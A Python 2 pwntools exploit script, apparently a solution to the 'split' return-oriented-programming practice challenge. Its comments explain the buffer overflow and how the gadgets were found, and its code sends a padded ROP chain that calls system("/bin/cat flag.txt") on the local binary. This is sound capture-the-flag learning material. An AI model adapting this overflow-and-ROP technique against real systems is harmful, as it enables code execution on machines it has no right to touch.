#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template sum
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('split')
context.terminal = "terminator -x".split()

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.pwnme:x}
break *0x0000000000400804
continue
'''.format(**locals())

io = start()

# This program has a buffer overflow. The pwnme() function
# calls fgets(buf, 50, stdin), although the buffer is only
# 32 bytes large ...

# The binary also has an usefulFunction() function that calls
# system("/bin/ls/"). This function is not called by the code.
# But because of this the .plt section has an entry for 'system',
# and since PIE is disabled, the entry has a constant address.
# The address of system@plt is 0x4005e0, and can be found with
#    $ objdump -d -M intel -j .plt ./split
#    $ rabin2 -i ./split    # alternative
#
# Looking at the strings in the program, we find that there
# is "/bin/cat flag.txt"... 
#
#    $ rabin2 -z ./split
#
# The plan here is to build a ROP chain to call
#    system("/bin/cat flag.txt")

# Look for a 'pop rdi' instruction, so that we can load rdi
# with the address of "/bin/cat flag.txt".
#   $ ropper --type=rop -f ./split --search='pop rdi'

# Wait for the prompt.
msg = io.recvuntil("> ")
print(msg)
# Build the input vector as 40 arbitrary bytes plus the first
# address of a ROP chain, that will overwrithe the saved RIP.
vector = "A" * 40
# The address of a "pop rdi; ret" gadget (found with ropper).
vector += p64(0x400883)
# A value for to be popped from the stack by "pop rdi".
vector += p64(0x00601060)
# Address of system@plt.
vector += p64(0x4005e0)
io.sendline(vector)
io.interactive()
